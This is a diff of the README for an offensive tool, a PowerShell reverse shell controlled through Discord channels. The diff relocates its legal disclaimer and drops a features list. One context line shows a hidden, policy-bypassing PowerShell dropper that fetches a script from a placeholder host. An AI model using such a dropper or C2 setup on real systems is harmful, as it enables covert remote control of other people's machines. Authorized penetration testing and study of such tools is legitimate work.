@@ -5,17 +5,6 @@
 
 X Shell is a PowerShell-based reverse shell that leverages a Discord server as its command-and-control (C2) infrastructure. It dynamically creates dedicated Discord channels for each user, enabling organized command execution and response tracking.
 
-## 🚨 Disclaimer
-
-**WARNING:** This tool is strictly for educational and authorized penetration testing purposes. Unauthorized use is illegal and may result in criminal prosecution. Always obtain explicit permission before testing.
-
-## Features
-
-- 🔒 Stealthy PowerShell dropper mechanism
-- 🤖 Discord-based command and control
-- 🔐 Dynamic channel creation for each session
-- 🌐 Flexible script retrieval mechanism
-
 ## Architecture
 
 ### Components
@@ -96,6 +85,10 @@ powershell -W Hidden -Exec Bypass -c "$r = iwr https://your-script-host.com/ -H 
 - Rotate tokens regularly
 - Monitor and log all activities
 - Ensure compliance with legal standards
+
+## 🚨 Disclaimer
+
+**WARNING:** This tool is strictly for educational and authorized penetration testing purposes. Unauthorized use is illegal and may result in criminal prosecution. Always obtain explicit permission before testing.
 
 ## Contributing
 
